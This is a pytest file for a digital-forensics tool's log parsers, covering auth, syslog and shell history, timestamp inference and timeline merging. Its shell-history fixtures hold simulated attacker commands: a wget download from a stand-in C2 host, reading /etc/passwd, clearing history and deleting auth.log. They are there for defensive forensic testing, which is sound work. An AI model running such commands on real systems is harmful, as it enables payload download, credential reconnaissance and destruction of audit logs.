"""RED Wave-0 scaffold for Phase-5 log parsing + normalization + time inference.

These stubs pin the exact pytest node IDs from 05-RESEARCH.md "Validation
Architecture > Phase Requirements -> Test Map" for the log slices (LOG-01/02/03/
04, D-45/D-46) plus the TIME-02 super-timeline merge. They reference the
(not-yet-existing) ``pyautopsy.log`` package — ``log.auth``, ``log.syslog``,
``log.shell_history``, ``log.timeresolve``, ``log.normalize``, ``log.discover``,
and ``core.logs`` — so each test FAILS until the Wave-1..3 slices build them.

Following the established Wave-0 idiom (cf. ``tests/test_knownfiles.py``), the
not-yet-existing modules are imported INSIDE each test body so the file COLLECTS
cleanly: an in-body ``ImportError`` is a test *failure* (RED), never a collection
error. None of these are ``xfail``/``skip`` — they are live gates the slices turn
green.

Ground truth comes from the committed ``log_search_image`` + its
``log_search_groundtruth`` sidecar (see ``tests/conftest.py``). No ``import
pytsk3`` here: log parsing is stdlib ``re``/``gzip``/``datetime``/``zoneinfo`` on
top of the existing FS seam, NOT a native importer (D-14 unaffected).
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from pyautopsy.case import TimelineEvent  # the LOG-04 model already exists
from pyautopsy.log.registry import ParsedRecord


def test_rfc3164_grammar() -> None:
    """LOG-01/02: the RFC3164 line grammar parses the canonical fields exactly.

    The dominant on-disk Linux format is ``Mmm dd HH:MM:SS host program[pid]: msg``
    (space-padded day, no year, no tz — the reason D-46 inference is required).
    The parser must surface ts/host/program/pid/msg for a representative line.
    """
    from pyautopsy.log import syslog  # noqa: PLC0415 (RED stub)

    line = (
        "Jan 02 08:05:10 host01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; "
        "USER=root ; COMMAND=/usr/bin/apt update"
    )
    parsed = syslog.parse_line(line)
    assert parsed is not None, "RFC3164 line failed to parse"
    assert parsed.program == "sudo"
    assert parsed.host == "host01"
    # The naive wall-clock components must be recoverable (year resolved later).
    assert "08:05:10" in (parsed.raw_timestamp or "")
    assert "COMMAND=/usr/bin/apt update" in parsed.message


def test_auth_taxonomy(
    log_search_image: Path, log_search_groundtruth: dict[str, Any]
) -> None:
    """LOG-01: auth.log login/SSH/sudo/failed-auth map to honest action/outcome.

    Parses the fixture's live ``/var/log/auth.log`` and asserts the well-known
    auth shapes (sshd Accepted/Failed-password, sudo authentication failure,
    PAM session opened/closed) become records carrying descriptive action +
    outcome (RESEARCH Pattern 4 — describes the observed line, never intent).
    An unmatched line is still emitted (raw msg in attributes), never dropped.
    """
    from pyautopsy.log import auth  # noqa: PLC0415 (RED stub)

    records = list(auth.parse(_AUTH_LIVE_TEXT))
    pairs = {(r.action, r.outcome) for r in records}
    # The live auth.log carries a sudo auth FAILURE, a failed ssh password, an
    # accepted publickey, and a session close.
    assert ("sudo", "denied") in pairs or ("sudo", "failure") in pairs
    assert ("ssh-login", "failure") in pairs
    assert ("ssh-login", "success") in pairs
    assert any(o in ("closed", "opened") for _, o in pairs)
    # Every record keeps the raw message — never silently dropped.
    assert all(getattr(r, "message", None) is not None for r in records)


def test_syslog_events() -> None:
    """LOG-02: syslog/messages yields service/kernel/cron/error events.

    The parser must turn the systemd/kernel/CRON/nginx-error lines into records
    that carry the program (service) and message; level/facility heuristics may
    annotate, but program extraction is the load-bearing LOG-02 signal.
    """
    from pyautopsy.log import syslog  # noqa: PLC0415 (RED stub)

    records = list(syslog.parse(_SYSLOG_TEXT))
    programs = {r.program for r in records}
    assert {"systemd", "kernel", "CRON", "nginx"} <= programs
    # The error line is preserved verbatim (no intent inferred).
    assert any("error" in (r.message or "").lower() for r in records)


def test_shell_history_tamperability() -> None:
    """LOG-03: bash/zsh history parsed; no-per-line-timestamp + tamperability flag.

    Bare bash lines have NO reliable per-line timestamp (Pitfall 2) — the parser
    must flag the fallback rather than invent a time, and surface a tamperability
    finding (e.g. on ``history -c``). zsh extended lines (``: <ts>:<dur>;cmd``)
    carry an embedded epoch the parser uses directly.
    """
    from pyautopsy.log import shell_history  # noqa: PLC0415 (RED stub)

    bash = shell_history.parse(_BASH_HISTORY_TEXT, kind="bash")
    zsh = shell_history.parse(_ZSH_HISTORY_TEXT, kind="zsh")

    bash_records = list(bash.records if hasattr(bash, "records") else bash)
    # At least one bash command line has no per-line timestamp -> flagged fallback.
    assert any(
        (getattr(r, "ts_basis", "") or "").startswith("file-mtime-fallback")
        or getattr(r, "timestamp", None) is None
        for r in bash_records
    )
    # A tamperability finding is surfaced for bash history (D-44, finding only).
    findings = getattr(bash, "findings", None)
    assert findings, "expected a shell-history tamperability finding"
    assert any(
        "tamper" in str(f).lower() or "history" in str(f).lower() for f in findings
    )

    # zsh extended lines carry an embedded epoch the parser uses directly.
    zsh_records = list(zsh.records if hasattr(zsh, "records") else zsh)
    assert any(getattr(r, "epoch", None) is not None for r in zsh_records)


def test_normalize_to_timeline_event() -> None:
    """LOG-04: a parsed record normalizes to a TimelineEvent with the full shape.

    The produced ``TimelineEvent`` must carry source/event-type/actor/action/
    outcome/file_id (the reserved Phase-5 columns) and a verbatim UTC ts_utc; the
    actor is honest (``user=alice``, never ``user=None``). Mirrors
    ``timeline/builder.explode`` purity.
    """
    from pyautopsy.log import normalize  # noqa: PLC0415 (RED stub)

    event = normalize.to_event(
        ParsedRecord(
            action="ssh-login",
            outcome="success",
            actor="user=alice",
            message="Accepted publickey for alice from 192.0.2.5",
        ),
        evidence_source_id=1,
        file_id=42,
        source="auth",
        log_path="/var/log/auth.log",
        utc_iso="2026-01-15T07:02:45+00:00",
        attrs={
            "timestamp_source": "log:inferred-tz",
            "assumed_timezone": "America/New_York",
        },
    )
    assert isinstance(event, TimelineEvent)
    assert event.source == "auth"
    assert event.action == "ssh-login"
    assert event.outcome == "success"
    assert event.actor == "user=alice"
    assert event.file_id == 42
    assert event.meta_addr is None  # log events have no inode
    assert event.ts_utc == "2026-01-15T07:02:45+00:00"  # verbatim, never re-derived


def test_timeresolve_inferred_and_flagged(
    log_search_image: Path, log_search_groundtruth: dict[str, Any]
) -> None:
    """D-46: tz inferred from /etc/localtime, year inferred, BOTH flagged; UTC warned.

    The host timezone is derived from the image (``/etc/localtime`` symlink ->
    ``/etc/timezone`` fallback) and recorded as ``America/New_York``; the RFC3164
    year is inferred from file mtime + rotation order. Both inferences are FLAGGED
    in the event attributes (never silent — the CR-01 lesson). When the zone is
    undeterminable the resolver falls back to UTC WITH an explicit warning flag.
    """
    from pyautopsy.log import timeresolve  # noqa: PLC0415 (RED stub)

    gt = log_search_groundtruth

    # 1. Inferred zone is flagged, not silently applied.
    iso, attrs = timeresolve.to_utc(
        _naive("Jan 15 02:02:45", year=gt["year"]),
        host_tz=timeresolve.zone(gt["timezone"]),
    )
    assert attrs.get("timestamp_source") == "log:inferred-tz"
    assert attrs.get("assumed_timezone") == gt["timezone"]
    assert iso.endswith("+00:00")

    # 2. UTC fallback is explicitly warned, never silent.
    _iso2, attrs2 = timeresolve.to_utc(
        _naive("Jan 15 02:02:45", year=gt["year"]), host_tz=None
    )
    assert attrs2.get("timestamp_source") == "log:assumed-utc"
    assert "warning" in " ".join(str(v) for v in attrs2.values()).lower()


def test_rotation_reassembly_order(
    log_search_image: Path, log_search_groundtruth: dict[str, Any]
) -> None:
    """D-45/Pitfall 4: rotated `.1`/`.2.gz` reassembled oldest->newest + completeness.

    ``auth.log.2.gz`` (Dec, prev year) precedes ``auth.log.1`` (early Jan) which
    precedes the live ``auth.log`` (later Jan). The discover step must order the
    members oldest->newest (NOT lexically) — load-bearing for year inference and
    the CR-01 deterministic insert order — and surface a log-completeness finding.
    """
    from pyautopsy.log import discover  # noqa: PLC0415 (RED stub)

    members = discover.order_rotated_set(
        log_search_groundtruth["auth_log_members_oldest_to_newest"][
            ::-1
        ]  # feed shuffled
    )
    paths = [m.path if hasattr(m, "path") else m for m in members]
    assert paths == log_search_groundtruth["auth_log_members_oldest_to_newest"]


def test_super_timeline_merge(log_search_image: Path, case_dir: Path) -> None:
    """TIME-02: get_timeline_events returns fs + log events in one UTC total order.

    After ingest + walk (filesystem events) and ``run_logs`` (log events written
    into the SAME ``timeline_events`` table), the existing D-26 ordered read IS
    the super-timeline: a single UTC-sorted sequence containing BOTH a filesystem
    event and a log event, with NO new ordering code (D-47).
    """
    from pyautopsy.case import CaseStore  # noqa: PLC0415
    from pyautopsy.core.ingest import run_ingest  # noqa: PLC0415
    from pyautopsy.core.logs import run_logs  # noqa: PLC0415 (RED stub)
    from pyautopsy.core.walk import run_walk  # noqa: PLC0415

    ingested = run_ingest(log_search_image, case_dir, examiner="X", evidence_id="E1")
    run_walk(log_search_image, case_dir, timezone="UTC")
    run_logs(log_search_image, case_dir, evidence_source_id=ingested.evidence_source_id)

    with CaseStore.open(case_dir) as store:
        events = store.get_timeline_events(ingested.evidence_source_id)

    sources = {e.source for e in events}
    assert any(s.startswith("filesystem") for s in sources), "missing filesystem events"
    assert sources & {"auth", "syslog", "shell-history"}, "missing log events"
    # One UTC total order: ts_utc is non-decreasing across the merged sequence.
    stamps = [e.ts_utc for e in events]
    assert stamps == sorted(stamps), "merged super-timeline is not UTC-ordered"
    assert all(s.endswith("+00:00") for s in stamps)


def test_run_logs_orchestrated_emits_syslog_and_shell_history(
    log_search_image: Path, case_dir: Path, log_search_groundtruth: dict[str, Any]
) -> None:
    """CR-01 regression: the ORCHESTRATED run_logs surfaces syslog + shell-history.

    This drives the real :func:`pyautopsy.core.logs.run_logs` end-to-end over the
    committed fixture — it does NOT import the syslog/shell_history modules by hand
    (that hand-import is exactly what masked CR-01: parser registration is an
    import-time side effect, so the Wave-2 tests passed while the orchestrated CLI
    path saw only the auth parser). It asserts that:

    * the registry the orchestrator iterates contains all three in-scope parsers,
    * syslog/messages events actually appear in the merged super-timeline,
    * per-user shell-history events appear (and carry the /home/<user> actor),
    * the fixture's two tied-second syslog lines BOTH land (the CR-01 tied-pair the
      05-04-SUMMARY noted run_logs did not yet merge), and
    * the merged timeline stays one UTC total order.

    If CR-01 is reverted (only auth registered/discovered), the syslog and
    shell-history assertions FAIL — this is the test whose absence let CR-01 ship.
    """
    from pyautopsy.case import CaseStore  # noqa: PLC0415
    from pyautopsy.core.ingest import run_ingest  # noqa: PLC0415
    from pyautopsy.core.logs import run_logs  # noqa: PLC0415
    from pyautopsy.core.walk import run_walk  # noqa: PLC0415
    from pyautopsy.log import PARSERS  # noqa: PLC0415

    # The orchestrated parser set must carry the full declared-order set, NOT
    # just auth — without importing the parser modules here (that is the
    # masking bug the old import-time registry allowed).
    names = {p.name for p in PARSERS}
    assert {"auth", "syslog", "shell-history"} <= names, (
        f"orchestrated registry missing parsers: {names}"
    )

    ingested = run_ingest(log_search_image, case_dir, examiner="X", evidence_id="E1")
    run_walk(log_search_image, case_dir, timezone="UTC")
    result = run_logs(
        log_search_image, case_dir, evidence_source_id=ingested.evidence_source_id
    )

    with CaseStore.open(case_dir) as store:
        events = store.get_timeline_events(ingested.evidence_source_id)

    by_source: dict[str, list[Any]] = {}
    for e in events:
        by_source.setdefault(e.source, []).append(e)

    # CR-01 core: syslog AND shell-history events are present on the REAL path.
    assert by_source.get("syslog"), "orchestrated run_logs produced no syslog events"
    assert by_source.get(
        "shell-history"
    ), "orchestrated run_logs produced no shell-history events"
    assert by_source.get("auth"), "orchestrated run_logs produced no auth events"

    # The fixture's tied-second syslog pair must BOTH be merged (05-04 gap closed).
    tied = [
        e
        for e in by_source["syslog"]
        if log_search_groundtruth["tied_second"] in (e.attributes.get("raw") or "")
    ]
    assert len(tied) == log_search_groundtruth["tied_event_count"], (
        f"expected {log_search_groundtruth['tied_event_count']} tied syslog lines, "
        f"got {len(tied)}"
    )
    assert {e.ts_utc for e in tied} == {tied[0].ts_utc}, "tied lines must share ts_utc"

    # Shell history carries the per-user actor derived from /home/<user>.
    assert any(
        e.actor == "user=alice" for e in by_source["shell-history"]
    ), "shell-history events missing the per-user actor"

    # log_sets counts auth + syslog rotated sets PLUS the two shell-history files.
    assert result.log_sets >= 4, (
        f"expected >=4 log sets discovered, got {result.log_sets}"
    )

    # One UTC total order across the merged super-timeline (TIME-02 / D-47).
    stamps = [e.ts_utc for e in events]
    assert stamps == sorted(stamps), "merged super-timeline is not UTC-ordered"
    assert all(s.endswith("+00:00") for s in stamps)


def test_run_logs_persists_findings(
    log_search_image: Path, case_dir: Path
) -> None:
    """G-2 close: run_logs persists the D-44 tamperability + D-45 completeness findings.

    The orchestrated :func:`run_logs` must capture the shell-history tamperability
    finding (``ShellHistoryResult.findings``, D-44) and the rotated-set completeness
    finding (``LogSet.finding.note``, D-45) and persist them through
    ``store.insert_log_findings`` in its single transaction, so they survive to the
    report.

    RED on pre-fix main: before this plan ``ShellHistoryParser.parse`` returned only
    ``.records`` (dropping ``.findings``) and ``run_logs`` had no log_findings sink,
    so ``store.get_log_findings(...)`` was empty and BOTH asserts below FAILED — the
    same drop that produced UAT test 9's "0 occurrences of tamper". This test would
    fail if that regression were reintroduced.
    """
    from pyautopsy.case import CaseStore  # noqa: PLC0415
    from pyautopsy.core.ingest import run_ingest  # noqa: PLC0415
    from pyautopsy.core.logs import run_logs  # noqa: PLC0415
    from pyautopsy.core.walk import run_walk  # noqa: PLC0415

    ingested = run_ingest(log_search_image, case_dir, examiner="X", evidence_id="E1")
    run_walk(log_search_image, case_dir, timezone="UTC")
    result = run_logs(
        log_search_image, case_dir, evidence_source_id=ingested.evidence_source_id
    )

    with CaseStore.open(case_dir) as store:
        findings = store.get_log_findings(ingested.evidence_source_id)

    tamper = [f for f in findings if f.category == "tamperability"]
    completeness = [f for f in findings if f.category == "completeness"]

    assert tamper, "run_logs persisted no D-44 tamperability finding"
    assert any(
        "editable" in (f.detail or "") or "history -c" in (f.detail or "")
        for f in tamper
    ), "tamperability detail missing the D-44 editable/`history -c` observed fact"
    assert completeness, "run_logs persisted no D-45 completeness finding"

    # The result's findings_count equals the number of persisted findings.
    assert result.findings_count == len(findings)


def test_groundtruth_year_matches_fixture_mtime(
    log_search_image: Path, case_dir: Path, log_search_groundtruth: dict[str, Any]
) -> None:
    """G-1 guard: the sidecar year matches the years D-46 infers from the fixture.

    UAT gap G-1 was a fixture-vs-sidecar DOCUMENTATION drift: the committed image is
    built with a frozen debugfs clock (``_EXT4_FAKE_TIME = 1700000000`` = 2023-11-14),
    so D-46 (:func:`pyautopsy.core.logs._seed_year_from_mtime`) seeds the RFC3164 year
    from the live member's mtime year (2023) and the oldest rotated member's Dec lines
    land in the prior year (2022) — yet the sidecar once asserted 2026/2025. The
    inference mechanism was SOUND; only the documented expectation was wrong.

    This guard drives the REAL path (ingest + walk + run_logs over the committed
    fixture), reads the persisted inferred (RFC3164, non-epoch) log events — those
    carrying a ``year_inferred`` attribute — and asserts every inferred year is drawn
    from ``{gt["prev_year"], gt["year"]}`` and that ``gt["year"]`` (the live-member seed
    year) is actually produced. It derives the years from the fixture's real mtime
    anchor (NOT a hard-coded literal), so editing the sidecar away from the value the
    image carries would fail it — the drift G-1 found cannot silently return.
    Deterministic: no wall-clock is read (D-46 seeds from evidence only, CLI-02).

    The pin reads each event's ``year_inferred`` attribute — the D-46 RFC3164 year the
    sidecar actually documents — NOT the calendar year of the tz-converted ``ts_utc``.
    A late-December line in the inferred host tz (America/New_York) crosses into the
    next UTC calendar year (``Dec 31 2023 23:59:59`` ET = ``2024-01-01T04:59:59Z``), so
    the UTC-year of ts_utc is a tz artifact, not the inferred year; ``year_inferred``
    is the value generator + sidecar agree on.
    """
    from pyautopsy.case import CaseStore  # noqa: PLC0415
    from pyautopsy.core.ingest import run_ingest  # noqa: PLC0415
    from pyautopsy.core.logs import run_logs  # noqa: PLC0415
    from pyautopsy.core.walk import run_walk  # noqa: PLC0415

    gt = log_search_groundtruth

    ingested = run_ingest(log_search_image, case_dir, examiner="X", evidence_id="E1")
    run_walk(log_search_image, case_dir, timezone="UTC")
    run_logs(
        log_search_image, case_dir, evidence_source_id=ingested.evidence_source_id
    )

    with CaseStore.open(case_dir) as store:
        events = store.get_timeline_events(ingested.evidence_source_id)

    # Inferred RFC3164 events are exactly those flagged with year_inferred (epoch
    # shell-history events resolve from embedded epochs and carry no such flag). The
    # year_inferred attribute is the D-46 RFC3164 year seeded from the fixture's real
    # mtime anchor — exactly what the sidecar documents.
    inferred_years = [
        int(attrs["year_inferred"])
        for e in events
        if "year_inferred" in (attrs := (e.attributes or {}))
    ]
    assert inferred_years, "no D-46 year-inferred log events found on the fixture"

    allowed = {gt["prev_year"], gt["year"]}
    stray = sorted({y for y in inferred_years if y not in allowed})
    assert not stray, (
        f"inferred years {stray} not in the sidecar-documented "
        f"{{prev_year={gt['prev_year']}, year={gt['year']}}} — "
        "fixture/sidecar drift (G-1)"
    )
    assert gt["year"] in inferred_years, (
        f"sidecar year {gt['year']} is not produced by the fixture's mtime anchor; "
        f"observed inferred years: {sorted(set(inferred_years))}"
    )


def test_infer_years_same_month_year_boundary() -> None:
    """CR-03: a same-month year boundary is recognised (month-only compare missed it).

    Two records one calendar year apart but in the SAME month (Dec 31 of the prior
    year → Jan/Dec wrap) must be assigned different years. The old month-only test
    (``cur_mon > next_mon``) returned ``Dec > Dec == False`` and wrongly collapsed
    the boundary; comparing full ``(month, day)`` across a Dec→Jan wrap fixes it.
    """
    from pyautopsy.log import timeresolve  # noqa: PLC0415

    # oldest→newest: Dec 20 (prev year), Jan 05 (seed year). A real year wrap.
    comps = [(12, 20, 0, 0, 0), (1, 5, 0, 0, 0)]
    years = [y for y, _ in timeresolve.infer_years(comps, seed_year=2026)]
    assert years == [2025, 2026], f"same-(year-)boundary mis-inferred: {years}"

    # Same month, ascending day, SAME year (Jan 02 → Jan 20) must NOT roll a year.
    comps_same = [(1, 2, 0, 0, 0), (1, 20, 0, 0, 0)]
    years_same = [y for y, _ in timeresolve.infer_years(comps_same, seed_year=2026)]
    assert years_same == [2026, 2026], f"same-month same-year mis-rolled: {years_same}"


def test_infer_years_single_out_of_order_no_cascade() -> None:
    """CR-03: one out-of-order line must NOT shift every earlier record's year.

    A lone anomalous late-dated line in an otherwise monotonic Jan run previously
    re-anchored the walk and cascaded a wholesale year shift onto all earlier
    records. With the running-minimum anchor + true-wrap guard, the anomaly is
    absorbed: the surrounding January records all stay in the seed year.
    """
    from pyautopsy.log import timeresolve  # noqa: PLC0415

    # oldest→newest, all January seed-year, with ONE stray Du (Jul) line in the
    # middle — a single out-of-order entry, not a genuine year boundary.
    comps = [
        (1, 2, 0, 0, 0),
        (1, 5, 0, 0, 0),
        (7, 9, 0, 0, 0),  # the lone anomaly
        (1, 8, 0, 0, 0),
        (1, 10, 0, 0, 0),
    ]
    years = [y for y, _ in timeresolve.infer_years(comps, seed_year=2026)]
    # The earlier January records must NOT be shifted back a year by the anomaly:
    # at most the single stray line may differ, never the whole prefix.
    assert years[0] == 2026 and years[1] == 2026, (
        f"single out-of-order line cascaded a year shift onto earlier records: {years}"
    )
    assert years[-1] == 2026 and years[-2] == 2026


# ---------------------------------------------------------------------------
# Local helpers + fixture text mirrors (kept inline so the file is self-contained
# and the stubs reference real, eventual symbols rather than magic strings).
# ---------------------------------------------------------------------------

_AUTH_LIVE_TEXT = (
    "Jan 15 02:00:00 host01 sudo: pam_unix(sudo:auth): authentication failure; "
    "logname=alice uid=1000 euid=0 tty=/dev/pts/1 ruser=alice rhost= user=alice\n"
    "Jan 15 02:01:30 host01 sshd[6001]: Failed password for alice from "
    "203.0.113.9 port 40000 ssh2\n"
    "Jan 15 02:02:45 host01 sshd[6002]: Accepted publickey for alice from "
    "192.0.2.5 port 40002 ssh2\n"
    "Jan 15 02:05:00 host01 sshd[6001]: session closed for user alice\n"
)

_SYSLOG_TEXT = (
    "Jan 15 01:00:00 host01 systemd[1]: Started Daily apt download activities.\n"
    "Jan 15 01:00:05 host01 kernel: [12345.6789] usb 1-1: new high-speed USB device\n"
    "Jan 15 01:30:00 host01 CRON[7001]: (root) CMD (/usr/bin/backup.sh)\n"
    "Jan 15 02:10:00 host01 nginx[8001]: error: upstream timed out\n"
)

_BASH_HISTORY_TEXT = (
    "ls -la\n"
    "cat /etc/passwd\n"
    "#1736899200\n"
    "wget http://evil-c2.example.invalid/payload.sh\n"
    "history -c\n"
)

_ZSH_HISTORY_TEXT = (
    ": 1736899300:0;whoami\n: 1736899305:2;sudo rm -rf /var/log/auth.log\n"
)


def _naive(month_day_time: str, *, year: int) -> Any:
    """Parse an RFC3164 ``Mmm dd HH:MM:SS`` head into a naive datetime at ``year``."""
    from datetime import datetime  # noqa: PLC0415

    return datetime.strptime(f"{year} {month_day_time}", "%Y %b %d %H:%M:%S")


def test_parser_order_is_declared_explicitly() -> None:
    """The parser order is stated, not emergent (EXT-01 / CR-01).

    This order fixes which parser claims a basename, hence the per-line parse
    order, hence the ``insert_timeline_events`` order, hence the store's
    surrogate-id tiebreak — the deterministic-tied-order guarantee. It used to
    be a side effect of which module got imported first; asserting it here
    means a reorder is a visible, deliberate change.
    """
    from pyautopsy.log import PARSERS  # noqa: PLC0415

    assert [p.name for p in PARSERS] == ["auth", "shell-history", "syslog"]


@pytest.mark.parametrize(
    ("basename", "expected"),
    [
        ("auth.log", "auth"),
        ("secure", "auth"),
        ("syslog", "syslog"),
        ("messages", "syslog"),
        (".bash_history", "shell-history"),
        (".zsh_history", "shell-history"),
        ("kern.log", None),
        ("dpkg.log", None),
        ("random.txt", None),
    ],
)
def test_parser_selection_per_basename(basename: str, expected: str | None) -> None:
    """Selection is first-match in declared order, unchanged per basename."""
    from pyautopsy.log import PARSERS  # noqa: PLC0415

    chosen = next((p for p in PARSERS if p.matches(basename)), None)
    assert (chosen.name if chosen else None) == expected


def test_importing_a_parser_module_mutates_no_global_state() -> None:
    """Importing a parser module has no side effect on parser selection.

    The old registry was populated by import-time ``register()`` calls, so what
    the orchestrator saw depended on what had been imported. Re-importing a
    parser module must now change nothing.
    """
    import importlib  # noqa: PLC0415

    from pyautopsy.log import PARSERS  # noqa: PLC0415

    before = list(PARSERS)
    for module in ("pyautopsy.log.auth", "pyautopsy.log.syslog",
                   "pyautopsy.log.shell_history"):
        importlib.reload(importlib.import_module(module))

    from pyautopsy.log import PARSERS as after  # noqa: PLC0415

    assert [p.name for p in after] == [p.name for p in before]
    assert len(after) == 3
